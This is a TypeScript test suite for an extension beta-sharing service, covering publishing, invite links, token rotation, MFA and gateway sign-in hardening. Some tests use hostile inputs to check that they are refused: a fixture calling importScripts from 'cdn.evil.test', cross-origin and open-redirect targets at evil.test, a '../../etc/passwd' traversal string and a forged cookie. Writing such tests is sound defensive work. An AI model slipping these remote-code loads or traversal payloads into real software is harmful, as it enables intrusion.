import { describe, expect, setDefaultTimeout, test } from "bun:test";
import type { PublishResultDto, ReleaseDto, TokenDto } from "@extshare/core";
import { CwsApiError } from "../src/cws";
import { base32Decode, TOTP_STEP_MS, totpAt } from "../src/security";
import type { Role } from "../src/store/types";
import {
  csrfFrom,
  fixturePackage,
  form,
  ITEM_ID,
  ITEM_ID_2,
  Jar,
  makeDeps,
  ORIGIN,
  PUBLIC_URL,
} from "./helpers";

type Env = ReturnType<typeof makeDeps>;
// argon2id password hashing is deliberately slow; several tests sign in more than one user.
setDefaultTimeout(60_000);
const PASSWORD = "correct horse battery staple";

async function req(env: Env, path: string, init: RequestInit = {}) {
  return env.app.request(`${PUBLIC_URL}${path}`, init);
}

/** Creates a user (in-memory fixture), signs in with password, enrols TOTP, returns the cookie jar. */
async function signIn(env: Env, email: string, opts: { role?: Role; workspaceId?: string } = {}) {
  if (!env.store.getUserByEmail(email)) {
    await env.auth.createUser({
      email,
      name: email,
      password: PASSWORD,
      role: opts.role ?? "owner",
      ...(opts.workspaceId ? { workspaceId: opts.workspaceId } : { workspaceName: `${email} ws` }),
    });
  }
  const jar = new Jar();
  const login = jar.take(
    await req(env, "/login", { method: "POST", headers: ORIGIN, body: form({ email, password: PASSWORD }) }),
  );
  expect(login.status).toBe(303);
  const mfaPath = login.headers.get("location")!;
  const page = jar.take(await req(env, mfaPath, { headers: jar.header() }));
  const html = await page.text();
  const user = env.store.getUserByEmail(email)!;
  const secret = user.totpSecret!;
  if (!user.totpEnabled) expect(html).toContain(secret);
  env.clock.advance(TOTP_STEP_MS); // never reuse a step across sign-ins
  const code = totpAt(base32Decode(secret), Math.floor(env.clock.now() / TOTP_STEP_MS));
  const done = jar.take(
    await req(env, mfaPath, {
      method: "POST",
      headers: { ...ORIGIN, ...jar.header() },
      body: form({ _csrf: csrfFrom(html), code }),
    }),
  );
  expect(done.status).toBe(303);
  return jar;
}

/** Runs the CLI device flow end to end through HTTP and returns tokens. */
async function deviceLogin(env: Env, jar: Jar): Promise<TokenDto> {
  const start = await (
    await req(env, "/api/device/start", {
      method: "POST",
      body: JSON.stringify({ clientName: "extshare CLI test" }),
    })
  ).json();
  const pending = await req(env, "/api/device/token", {
    method: "POST",
    body: JSON.stringify({ deviceCode: start.deviceCode }),
  });
  expect(pending.status).toBe(202);
  const page = await req(env, `/device?code=${start.userCode}`, { headers: jar.header() });
  const html = await page.text();
  expect(html).toContain("extshare CLI test");
  const approve = await req(env, "/device", {
    method: "POST",
    headers: { ...ORIGIN, ...jar.header() },
    body: form({ _csrf: csrfFrom(html), code: start.userCode, decision: "approve" }),
  });
  expect(approve.status).toBe(303);
  env.clock.advance(5000);
  const tok = await req(env, "/api/device/token", {
    method: "POST",
    body: JSON.stringify({ deviceCode: start.deviceCode }),
  });
  expect(tok.status).toBe(200);
  return tok.json();
}

const bearer = (t: string) => ({ authorization: `Bearer ${t}` });

async function createProject(env: Env, token: string, itemId = ITEM_ID, visibility = "private") {
  const r = await req(env, "/api/projects", {
    method: "POST",
    headers: bearer(token),
    body: JSON.stringify({ name: "My Ext", itemId, visibility }),
  });
  expect(r.status).toBe(201);
  return (await r.json()).id as string;
}

async function publish(
  env: Env,
  token: string,
  projectId: string,
  zip: Uint8Array,
  meta: Record<string, unknown> = {},
  headers: Record<string, string> = {},
) {
  const fd = new FormData();
  fd.set("meta", JSON.stringify({ ttl: "7d", testers: ["tester@example.com"], ...meta }));
  fd.set("package", new File([new Uint8Array(zip)], "pkg.zip", { type: "application/zip" }));
  return req(env, `/api/projects/${projectId}/releases`, {
    method: "POST",
    headers: { ...bearer(token), ...headers },
    body: fd,
  });
}

async function testerSignIn(env: Env, inviteUrl: string, email: string) {
  const path = new URL(inviteUrl).pathname;
  const jar = new Jar();
  const start = jar.take(await req(env, `${path}/signin`));
  expect(start.status).toBe(302);
  const idpUrl = new URL(start.headers.get("location")!);
  const code = `code-for-${email}`;
  env.idp.identities.set(code, { sub: email, email });
  const cb = jar.take(
    await req(env, `/auth/google/callback?code=${code}&state=${idpUrl.searchParams.get("state")}`, {
      headers: jar.header(),
    }),
  );
  expect(cb.status).toBe(302);
  expect(cb.headers.get("location")).toBe(path);
  return jar;
}

async function setup() {
  const env = makeDeps();
  const jar = await signIn(env, "owner@example.com");
  const tokens = await deviceLogin(env, jar);
  return { env, jar, token: tokens.accessToken, tokens };
}

describe("end-to-end: publish, share, install, revoke", () => {
  test("full tester journey through the gateway", async () => {
    const { env, token } = await setup();
    const projectId = await createProject(env, token);

    const pub = await publish(env, token, projectId, fixturePackage("1.0.0"), {
      testers: ["Tester@Example.com"],
      notes: "first build",
    });
    expect(pub.status).toBe(201);
    const { release, invite } = (await pub.json()) as PublishResultDto;
    expect(release).toMatchObject({
      version: "1.0.0",
      state: "in_review",
      testers: ["tester@example.com"],
      notes: "first build",
    });
    expect(env.cws.calls).toEqual([
      { op: "upload", itemId: ITEM_ID, size: expect.any(Number) },
      { op: "publish", itemId: ITEM_ID, publishType: "DEFAULT_PUBLISH" },
    ]);
    expect(invite!.url).toMatch(new RegExp(`^${PUBLIC_URL}/r/[A-Za-z0-9_-]{43}$`));
    expect(invite!.expiresAt).toBe(release.expiresAt);
    // The raw invite token is never stored, only its hash.
    const token64 = invite!.url.split("/r/")[1]!;
    expect(JSON.stringify(env.store.listInvites(release.id))).not.toContain(token64);
    expect(await env.artifacts.get(release.sha256)).not.toBeNull();

    const path = new URL(invite!.url).pathname;
    const anon = await req(env, path);
    expect(anon.status).toBe(200);
    const anonHtml = await anon.text();
    expect(anonHtml).toContain("Sign in with Google");
    expect(anonHtml).not.toContain(ITEM_ID); // nothing about the item leaks before sign-in

    const testerJar = await testerSignIn(env, invite!.url, "tester@example.com");
    expect(env.idp.lastExchange!.redirectUri).toBe(`${PUBLIC_URL}/auth/google/callback`);
    const pendingPage = await req(env, path, { headers: testerJar.header() });
    expect(pendingPage.status).toBe(200);
    expect(await pendingPage.text()).toContain("in review");

    env.cws.status = {
      publishedItemRevisionStatus: {
        state: "PUBLISHED_TO_TESTERS",
        distributionChannels: [{ crxVersion: "1.0.0", deployPercentage: 100 }],
      },
    };
    const synced = (await (
      await req(env, `/api/releases/${release.id}/sync`, { method: "POST", headers: bearer(token) })
    ).json()) as ReleaseDto;
    expect(synced.state).toBe("live");

    const live = await req(env, path, { headers: testerJar.header() });
    const liveHtml = await live.text();
    expect(live.status).toBe(200);
    expect(liveHtml).toContain(`href="https://chromewebstore.google.com/detail/${ITEM_ID}"`);
    expect(liveHtml).toContain('rel="noopener noreferrer"');
    expect(live.headers.get("referrer-policy")).toBe("no-referrer");

    const outsider = await testerSignIn(env, invite!.url, "mallory@example.com");
    const denied = await req(env, path, { headers: outsider.header() });
    expect(denied.status).toBe(403);
    expect(await denied.text()).not.toContain(ITEM_ID);

    const revoke = await req(env, `/api/releases/${release.id}/revoke`, {
      method: "POST",
      headers: bearer(token),
      body: JSON.stringify({ reason: "done" }),
    });
    expect((await revoke.json()).release.state).toBe("revoked");
    // A live release is not "in review", so no cancel call is made.
    expect(env.cws.ops()).not.toContain("cancelSubmission");
    const after = await req(env, path, { headers: testerJar.header() });
    expect(after.status).toBe(410);
    expect(await after.text()).toContain("This test has ended");

    const audit = (await (
      await req(env, `/api/releases/${release.id}/audit`, { headers: bearer(token) })
    ).json()) as { action: string; actor: string }[];
    const actions = audit.map((a) => a.action);
    for (const a of [
      "release.created",
      "invite.created",
      "gateway.pending",
      "gateway.allow",
      "gateway.forbidden",
      "release.revoked",
      "gateway.deny",
    ]) {
      expect(actions).toContain(a);
    }
    expect(audit.find((a) => a.action === "gateway.forbidden")!.actor).toBe("mallory@example.com");
  });

  test("revoking an in-review release cancels the submission; kill switch publishes an inert successor", async () => {
    const { env, token } = await setup();
    const projectId = await createProject(env, token);
    const { release } = (await (
      await publish(env, token, projectId, fixturePackage("2.3.4"))
    ).json()) as PublishResultDto;
    env.cws.calls = [];
    const r = await req(env, `/api/releases/${release.id}/revoke`, {
      method: "POST",
      headers: bearer(token),
      body: JSON.stringify({ reason: "leak", cancelSubmission: true, killSwitch: true }),
    });
    const body = await r.json();
    expect(env.cws.ops()).toEqual(["cancelSubmission", "upload", "publish"]);
    expect(body.withdrawal).toMatchObject({ kind: "withdrawal", version: "2.3.4.1", state: "in_review" });
    expect(env.cws.lastUploadedVersion).toBe("2.3.4.1");
    // The withdrawal has no testers and no share link.
    expect(body.withdrawal.testers).toEqual([]);
    expect(env.store.listInvites(body.withdrawal.id)).toEqual([]);
    const second = await req(env, `/api/releases/${release.id}/revoke`, {
      method: "POST",
      headers: bearer(token),
      body: "{}",
    });
    expect(second.status).toBe(409);
  });

  test("dashboard renders projects, release page, creates a one-time invite link", async () => {
    const { env, jar, token } = await setup();
    const projectId = await createProject(env, token);
    const { release } = (await (
      await publish(env, token, projectId, fixturePackage("1.0"))
    ).json()) as PublishResultDto;
    const home = await (await req(env, "/", { headers: jar.header() })).text();
    expect(home).toContain("My Ext");
    const page = await req(env, `/releases/${release.id}`, { headers: jar.header() });
    const html = await page.text();
    expect(html).toContain("tester@example.com");
    expect(html).not.toContain("/r/"); // existing link is never re-displayed
    const created = await req(env, `/releases/${release.id}/invite`, {
      method: "POST",
      headers: { ...ORIGIN, ...jar.header() },
      body: form({ _csrf: csrfFrom(html) }),
    });
    const createdHtml = await created.text();
    const url = createdHtml.match(/value="(https:\/\/extshare\.test\/r\/[^"]+)"/)![1]!;
    expect(created.headers.get("cache-control")).toBe("no-store");
    // Rotation: the link returned at publish time no longer works, the new one does.
    const invites = env.store.listInvites(release.id);
    expect(invites.filter((i) => i.revokedAt === null)).toHaveLength(1);
    expect((await req(env, new URL(url).pathname)).status).toBe(200);

    const add = await req(env, `/releases/${release.id}/testers`, {
      method: "POST",
      headers: { ...ORIGIN, ...jar.header() },
      body: form({ _csrf: csrfFrom(html), add: "b@example.com, c@example.com\nnot-an-email" }),
    });
    expect(add.status).toBe(400);
    expect(await add.text()).toContain("add.2");
    const add2 = await req(env, `/releases/${release.id}/testers`, {
      method: "POST",
      headers: { ...ORIGIN, ...jar.header() },
      body: form({ _csrf: csrfFrom(html), add: "b@example.com, c@example.com" }),
    });
    expect(add2.status).toBe(303);
    expect(env.store.listTesters(release.id).map((t) => t.email)).toEqual([
      "b@example.com",
      "c@example.com",
      "tester@example.com",
    ]);
    const audit = await (await req(env, "/audit", { headers: jar.header() })).text();
    expect(audit).toContain("testers.changed");
  });
});

describe("publish validation and store failures", () => {
  test("invalid package is rejected with findings and nothing is uploaded", async () => {
    const { env, token } = await setup();
    const projectId = await createProject(env, token);
    const r = await publish(
      env,
      token,
      projectId,
      fixturePackage("1.0", { "lib.js": "importScripts('https://cdn.evil.test/x.js')" }),
    );
    expect(r.status).toBe(422);
    const body = await r.json();
    expect(body.error.code).toBe("package_invalid");
    expect(body.error.findings.map((f: { code: string }) => f.code)).toContain("remote_code");
    expect(env.cws.calls).toEqual([]);
    expect(env.store.listReleases(projectId)).toEqual([]);
  });

  test("version must increase past the last uploaded version", async () => {
    const { env, token } = await setup();
    const projectId = await createProject(env, token);
    expect((await publish(env, token, projectId, fixturePackage("1.2"))).status).toBe(201);
    for (const v of ["1.2", "1.1.9", "1.2.0"]) {
      const r = await publish(env, token, projectId, fixturePackage(v));
      expect(r.status).toBe(409);
      expect((await r.json()).error.code).toBe("version_not_bumped");
    }
    expect((await publish(env, token, projectId, fixturePackage("1.2.0.1"))).status).toBe(201);
  });

  test("private projects require testers; testers are inherited from the previous build", async () => {
    const { env, token } = await setup();
    const projectId = await createProject(env, token);
    const none = await publish(env, token, projectId, fixturePackage("1.0"), { testers: [] });
    expect(none.status).toBe(400);
    await publish(env, token, projectId, fixturePackage("1.0"), { testers: ["a@x.com"] });
    const second = (await (
      await publish(env, token, projectId, fixturePackage("1.1"), { testers: ["b@x.com"] })
    ).json()) as PublishResultDto;
    expect(second.release.testers).toEqual(["a@x.com", "b@x.com"]);
    const third = (await (
      await publish(env, token, projectId, fixturePackage("1.2"), {
        testers: ["c@x.com"],
        inheritTesters: false,
      })
    ).json()) as PublishResultDto;
    expect(third.release.testers).toEqual(["c@x.com"]);
  });

  test("hash mismatch, bad TTL and malformed meta are 400s", async () => {
    const { env, token } = await setup();
    const projectId = await createProject(env, token);
    const zip = fixturePackage("1.0");
    expect(
      (await publish(env, token, projectId, zip, {}, { "x-content-sha256": "0".repeat(64) })).status,
    ).toBe(400);
    expect((await publish(env, token, projectId, zip, { ttl: "5m" })).status).toBe(400);
    expect((await publish(env, token, projectId, zip, { ttl: "100d" })).status).toBe(400);
    expect((await publish(env, token, projectId, zip, { testers: ["nope"] })).status).toBe(400);
    expect(env.cws.calls).toEqual([]);
  });

  test("upload failure leaves the version reusable; submit failure does not", async () => {
    const { env, token } = await setup();
    const projectId = await createProject(env, token);
    env.cws.uploadError = new CwsApiError("upload", 500, "backend error");
    const a = (await (
      await publish(env, token, projectId, fixturePackage("1.0"))
    ).json()) as PublishResultDto;
    expect(a.release.state).toBe("failed");
    expect(a.release.stateDetail).toContain("backend error");
    env.cws.uploadError = null;
    env.cws.publishError = new CwsApiError("publish", 400, "item has a pending submission");
    const b = (await (
      await publish(env, token, projectId, fixturePackage("1.0"))
    ).json()) as PublishResultDto;
    expect(b.release.state).toBe("failed");
    expect(b.release.stateDetail).toContain("pending submission");
    env.cws.publishError = null;
    expect((await publish(env, token, projectId, fixturePackage("1.0"))).status).toBe(409);
  });

  test("async processing hands off to the sync loop, which submits once the upload finishes", async () => {
    const { env, token } = await setup();
    const projectId = await createProject(env, token);
    env.cws.uploadState = "UPLOAD_IN_PROGRESS";
    env.cws.status = { lastAsyncUploadState: "IN_PROGRESS" };
    const { release } = (await (
      await publish(env, token, projectId, fixturePackage("3.0"))
    ).json()) as PublishResultDto;
    expect(release.state).toBe("processing");
    expect(env.cws.ops()).toEqual(["upload", "fetchStatus", "fetchStatus", "fetchStatus"]);
    env.cws.status = { lastAsyncUploadState: "SUCCEEDED" };
    expect(await env.releases.syncAll()).toBe(1);
    expect(env.cws.ops().at(-1)).toBe("publish");
    expect(env.store.getRelease(release.id)!.state).toBe("in_review");
  });

  test("a newer live build supersedes the older one and its link stops offering installs", async () => {
    const { env, token } = await setup();
    const projectId = await createProject(env, token);
    env.cws.publishState = "PUBLISHED";
    const a = (await (
      await publish(env, token, projectId, fixturePackage("1.0"))
    ).json()) as PublishResultDto;
    expect(a.release.state).toBe("live");
    const b = (await (
      await publish(env, token, projectId, fixturePackage("1.1"))
    ).json()) as PublishResultDto;
    expect(b.release.state).toBe("live");
    expect(env.store.getRelease(a.release.id)!.state).toBe("superseded");
    const jar = await testerSignIn(env, a.invite!.url, "tester@example.com");
    const page = await (await req(env, new URL(a.invite!.url).pathname, { headers: jar.header() })).text();
    expect(page).toContain("superseded");
    expect(page).not.toContain("chromewebstore.google.com/detail");
  });
});

describe("TTL, extension and expiry", () => {
  test("expiry closes the release and its links; extending is refused afterwards", async () => {
    const { env, token, tokens } = await setup();
    const projectId = await createProject(env, token);
    const { release, invite } = (await (
      await publish(env, token, projectId, fixturePackage("1.0"), { ttl: "1h" })
    ).json()) as PublishResultDto;
    env.clock.advance(30 * 60_000);
    const ext = (await (
      await req(env, `/api/releases/${release.id}/extend`, {
        method: "POST",
        headers: bearer(token),
        body: JSON.stringify({ ttl: "2h" }),
      })
    ).json()) as ReleaseDto;
    expect(ext.expiresAt).toBe(env.clock.now() + 2 * 3_600_000);
    // The invite created with the release moved along with it.
    expect(env.store.listInvites(release.id)[0]!.expiresAt).toBe(ext.expiresAt);
    env.clock.advance(2 * 3_600_000 - 1);
    expect(env.releases.sweepExpired()).toBe(0);
    env.clock.advance(1);
    expect(env.releases.sweepExpired()).toBe(1);
    expect(env.store.getRelease(release.id)!.state).toBe("expired");
    expect(env.releases.sweepExpired()).toBe(0); // idempotent
    const gw = await req(env, new URL(invite!.url).pathname);
    expect(gw.status).toBe(410);
    expect(await gw.text()).toContain("test window has closed");
    // 2.5 h have passed, so the 1 h access token expired; refresh like the CLI does.
    expect((await req(env, "/api/me", { headers: bearer(token) })).status).toBe(401);
    const fresh = (await (
      await req(env, "/api/token/refresh", {
        method: "POST",
        body: JSON.stringify({ refreshToken: tokens.refreshToken }),
      })
    ).json()) as TokenDto;
    const again = await req(env, `/api/releases/${release.id}/extend`, {
      method: "POST",
      headers: bearer(fresh.accessToken),
      body: JSON.stringify({ ttl: "1d" }),
    });
    expect(again.status).toBe(409);
    // A status sync never resurrects an expired release.
    env.cws.status = {
      publishedItemRevisionStatus: { state: "PUBLISHED", distributionChannels: [{ crxVersion: "1.0" }] },
    };
    await env.releases.syncAll();
    expect(env.store.getRelease(release.id)!.state).toBe("expired");
  });
});

describe("authentication and authorisation", () => {
  test("API requires a valid bearer token", async () => {
    const { env } = await setup();
    expect((await req(env, "/api/me")).status).toBe(401);
    expect((await req(env, "/api/me", { headers: bearer("xsa_nope") })).status).toBe(401);
  });

  test("access token expires after an hour; refresh rotates; reuse revokes the family", async () => {
    const { env, tokens } = await setup();
    env.clock.advance(3_600_000);
    expect((await req(env, "/api/me", { headers: bearer(tokens.accessToken) })).status).toBe(401);
    const r1 = (await (
      await req(env, "/api/token/refresh", {
        method: "POST",
        body: JSON.stringify({ refreshToken: tokens.refreshToken }),
      })
    ).json()) as TokenDto;
    expect(r1.refreshToken).not.toBe(tokens.refreshToken);
    expect((await req(env, "/api/me", { headers: bearer(r1.accessToken) })).status).toBe(200);
    const reuse = await req(env, "/api/token/refresh", {
      method: "POST",
      body: JSON.stringify({ refreshToken: tokens.refreshToken }),
    });
    expect(reuse.status).toBe(401);
    // Theft signal: the legitimately rotated tokens are revoked too.
    expect((await req(env, "/api/me", { headers: bearer(r1.accessToken) })).status).toBe(401);
    const r2 = await req(env, "/api/token/refresh", {
      method: "POST",
      body: JSON.stringify({ refreshToken: r1.refreshToken }),
    });
    expect(r2.status).toBe(401);
  });

  test("logout revokes the token family", async () => {
    const { env, tokens } = await setup();
    expect(
      (await req(env, "/api/logout", { method: "POST", headers: bearer(tokens.accessToken) })).status,
    ).toBe(200);
    expect((await req(env, "/api/me", { headers: bearer(tokens.accessToken) })).status).toBe(401);
    expect(
      (
        await req(env, "/api/token/refresh", {
          method: "POST",
          body: JSON.stringify({ refreshToken: tokens.refreshToken }),
        })
      ).status,
    ).toBe(401);
  });

  test("device codes: denial, single use, slow-down, expiry", async () => {
    const { env, jar } = await setup();
    const start = await (await req(env, "/api/device/start", { method: "POST", body: "{}" })).json();
    await req(env, "/api/device/token", {
      method: "POST",
      body: JSON.stringify({ deviceCode: start.deviceCode }),
    });
    const fast = await (
      await req(env, "/api/device/token", {
        method: "POST",
        body: JSON.stringify({ deviceCode: start.deviceCode }),
      })
    ).json();
    expect(fast).toEqual({ pending: true, slowDown: true });
    const html = await (await req(env, `/device?code=${start.userCode}`, { headers: jar.header() })).text();
    await req(env, "/device", {
      method: "POST",
      headers: { ...ORIGIN, ...jar.header() },
      body: form({ _csrf: csrfFrom(html), code: start.userCode, decision: "deny" }),
    });
    const denied = await req(env, "/api/device/token", {
      method: "POST",
      body: JSON.stringify({ deviceCode: start.deviceCode }),
    });
    expect(denied.status).toBe(403);

    const s2 = await (await req(env, "/api/device/start", { method: "POST", body: "{}" })).json();
    env.clock.advance(10 * 60_000);
    expect(
      (
        await req(env, "/api/device/token", {
          method: "POST",
          body: JSON.stringify({ deviceCode: s2.deviceCode }),
        })
      ).status,
    ).toBe(410);
    expect((await req(env, `/device?code=${s2.userCode}`, { headers: jar.header() })).status).toBe(404);

    const tokens = await deviceLogin(env, jar);
    expect(tokens.accessToken).toMatch(/^xsa_/);
  });

  test("viewers cannot publish; other workspaces' projects are invisible", async () => {
    const { env, token } = await setup();
    const projectId = await createProject(env, token);
    const wsId = env.store.getProject(projectId)!.workspaceId;
    const viewerJar = await signIn(env, "viewer@example.com", { role: "viewer", workspaceId: wsId });
    const viewer = await deviceLogin(env, viewerJar);
    expect(
      (await req(env, `/api/projects/${projectId}`, { headers: bearer(viewer.accessToken) })).status,
    ).toBe(200);
    const denied = await publish(env, viewer.accessToken, projectId, fixturePackage("1.0"));
    expect(denied.status).toBe(403);

    const otherJar = await signIn(env, "other@example.com");
    const other = await deviceLogin(env, otherJar);
    expect(
      (await req(env, `/api/projects/${projectId}`, { headers: bearer(other.accessToken) })).status,
    ).toBe(404);
    expect((await publish(env, other.accessToken, projectId, fixturePackage("1.0"))).status).toBe(404);
    expect(await (await req(env, "/api/projects", { headers: bearer(other.accessToken) })).json()).toEqual(
      [],
    );
    // The same Web Store item cannot be claimed by a second workspace.
    const claim = await req(env, "/api/projects", {
      method: "POST",
      headers: bearer(other.accessToken),
      body: JSON.stringify({ name: "x", itemId: ITEM_ID, visibility: "private" }),
    });
    expect(claim.status).toBe(409);
    expect((await createProject(env, other.accessToken, ITEM_ID_2)).startsWith("prj_")).toBe(true);
  });
});

describe("dashboard security", () => {
  test("unauthenticated and pre-MFA sessions cannot reach the dashboard", async () => {
    const env = makeDeps();
    const r = await req(env, "/releases/x");
    expect(r.status).toBe(303);
    expect(r.headers.get("location")).toBe("/login?next=%2Freleases%2Fx");
    await env.auth.createUser({
      email: "a@x.com",
      name: "a",
      password: PASSWORD,
      role: "owner",
      workspaceName: "w",
    });
    const jar = new Jar();
    jar.take(
      await req(env, "/login", {
        method: "POST",
        headers: ORIGIN,
        body: form({ email: "a@x.com", password: PASSWORD }),
      }),
    );
    const pre = await req(env, "/", { headers: jar.header() });
    expect(pre.status).toBe(303);
    expect(pre.headers.get("location")).toStartWith("/login/mfa");
  });

  test("wrong password and wrong TOTP are refused and rate limited", async () => {
    const env = makeDeps();
    await env.auth.createUser({
      email: "a@x.com",
      name: "a",
      password: PASSWORD,
      role: "owner",
      workspaceName: "w",
    });
    const bad = await req(env, "/login", {
      method: "POST",
      headers: ORIGIN,
      body: form({ email: "a@x.com", password: "wrong password!!" }),
    });
    expect(bad.status).toBe(401);
    for (let i = 0; i < 7; i++)
      await req(env, "/login", {
        method: "POST",
        headers: ORIGIN,
        body: form({ email: "a@x.com", password: "x" }),
      });
    const limited = await req(env, "/login", {
      method: "POST",
      headers: ORIGIN,
      body: form({ email: "a@x.com", password: PASSWORD }),
    });
    expect(limited.status).toBe(429);
  });

  test("cross-origin posts and missing CSRF tokens are refused", async () => {
    const { env, jar, token } = await setup();
    const projectId = await createProject(env, token);
    const noOrigin = await req(env, "/projects", {
      method: "POST",
      headers: jar.header(),
      body: form({ name: "x" }),
    });
    expect(noOrigin.status).toBe(403);
    const evil = await req(env, "/projects", {
      method: "POST",
      headers: { origin: "https://evil.test", ...jar.header() },
      body: form({ name: "x" }),
    });
    expect(evil.status).toBe(403);
    const noCsrf = await req(env, "/projects", {
      method: "POST",
      headers: { ...ORIGIN, ...jar.header() },
      body: form({ name: "x", itemId: ITEM_ID_2, visibility: "private" }),
    });
    expect(noCsrf.status).toBe(403);
    expect(env.store.listProjects(env.store.getProject(projectId)!.workspaceId)).toHaveLength(1);
  });

  test("login redirect target cannot leave the site", async () => {
    const env = makeDeps();
    await env.auth.createUser({
      email: "a@x.com",
      name: "a",
      password: PASSWORD,
      role: "owner",
      workspaceName: "w",
    });
    for (const next of ["//evil.test/x", "https://evil.test", "/\\evil.test"]) {
      const r = await req(env, `/login?next=${encodeURIComponent(next)}`, {
        method: "POST",
        headers: ORIGIN,
        body: form({ email: "a@x.com", password: PASSWORD }),
      });
      expect(r.headers.get("location")).toBe("/mfa/setup?next=%2F");
    }
  });

  test("every response carries the security headers", async () => {
    const env = makeDeps();
    for (const path of ["/login", "/r/does-not-exist-but-long-enough", "/api/me", "/healthz"]) {
      const r = await req(env, path);
      expect(r.headers.get("content-security-policy")).toContain("default-src 'none'");
      expect(r.headers.get("content-security-policy")).toContain("frame-ancestors 'none'");
      expect(r.headers.get("referrer-policy")).toBe("no-referrer");
      expect(r.headers.get("x-content-type-options")).toBe("nosniff");
      expect(r.headers.get("strict-transport-security")).toContain("max-age=");
    }
    const login = await req(env, "/login");
    expect(login.headers.get("cache-control")).toBe("no-store");
  });

  test("session cookies are HttpOnly, Secure, SameSite=Lax, __Host- prefixed", async () => {
    const env = makeDeps();
    await env.auth.createUser({
      email: "a@x.com",
      name: "a",
      password: PASSWORD,
      role: "owner",
      workspaceName: "w",
    });
    const r = await req(env, "/login", {
      method: "POST",
      headers: ORIGIN,
      body: form({ email: "a@x.com", password: PASSWORD }),
    });
    const c = r.headers.getSetCookie()[0]!;
    expect(c).toStartWith("__Host-xs_session=");
    expect(c).toContain("HttpOnly");
    expect(c).toContain("Secure");
    expect(c).toContain("SameSite=Lax");
    expect(c).toContain("Path=/");
    expect(c).not.toContain("Domain=");
  });
});

describe("gateway sign-in hardening", () => {
  async function withInvite() {
    const { env, token } = await setup();
    const projectId = await createProject(env, token);
    const { invite } = (await (
      await publish(env, token, projectId, fixturePackage("1.0"))
    ).json()) as PublishResultDto;
    return { env, path: new URL(invite!.url).pathname };
  }

  test("unknown or malformed tokens get the same invalid-link page", async () => {
    const { env } = await withInvite();
    for (const t of ["x", "A".repeat(43), "../../etc/passwd"]) {
      const r = await req(env, `/r/${encodeURIComponent(t)}`);
      expect(r.status).toBe(404);
      expect(await r.text()).toContain("This link is not valid");
    }
  });

  test("callback refuses a mismatched state, a missing flow cookie, and a forged flow cookie", async () => {
    const { env, path } = await withInvite();
    const jar = new Jar();
    jar.take(await req(env, `${path}/signin`));
    env.idp.identities.set("c", { sub: "1", email: "tester@example.com" });
    expect(
      (await req(env, "/auth/google/callback?code=c&state=wrong", { headers: jar.header() })).status,
    ).toBe(400);
    expect((await req(env, "/auth/google/callback?code=c&state=x")).status).toBe(400);
    const forged = Buffer.from(
      JSON.stringify({ v: { state: "s", nonce: "n", verifier: "v", token: "t" }, exp: 9e15 }),
    ).toString("base64url");
    const r = await req(env, "/auth/google/callback?code=c&state=s", {
      headers: { cookie: `__Host-xs_oidc=${forged}.AAAA` },
    });
    expect(r.status).toBe(400);
    expect(r.headers.getSetCookie().some((c) => c.startsWith("__Host-xs_tester="))).toBe(false);
  });

  test("a failed code exchange shows an error and creates no session", async () => {
    const { env, path } = await withInvite();
    const jar = new Jar();
    const start = jar.take(await req(env, `${path}/signin`));
    const state = new URL(start.headers.get("location")!).searchParams.get("state");
    const r = await req(env, `/auth/google/callback?code=unknown&state=${state}`, { headers: jar.header() });
    expect(r.status).toBe(502);
    expect(r.headers.getSetCookie().some((c) => c.startsWith("__Host-xs_tester="))).toBe(false);
  });

  test("signing out requires same-origin POST and clears the session", async () => {
    const { env, path } = await withInvite();
    const jar = await testerSignIn(env, `${PUBLIC_URL}${path}`, "tester@example.com");
    expect((await req(env, `${path}/signout`, { method: "POST", headers: jar.header() })).status).toBe(403);
    const out = jar.take(
      await req(env, `${path}/signout`, { method: "POST", headers: { ...ORIGIN, ...jar.header() } }),
    );
    expect(out.status).toBe(303);
    const page = await req(env, path, { headers: jar.header() });
    expect(await page.text()).toContain("Sign in with Google");
  });

  test("without a configured identity provider the gateway refuses sign-in", async () => {
    const env = makeDeps({ idp: null });
    const jar = await signIn(env, "o@x.com");
    const t = (await deviceLogin(env, jar)).accessToken;
    const projectId = await createProject(env, t);
    const { invite } = (await (
      await publish(env, t, projectId, fixturePackage("1.0"))
    ).json()) as PublishResultDto;
    const path = new URL(invite!.url).pathname;
    expect(await (await req(env, path)).text()).toContain("not configured");
    expect((await req(env, `${path}/signin`)).status).toBe(503);
  });
});
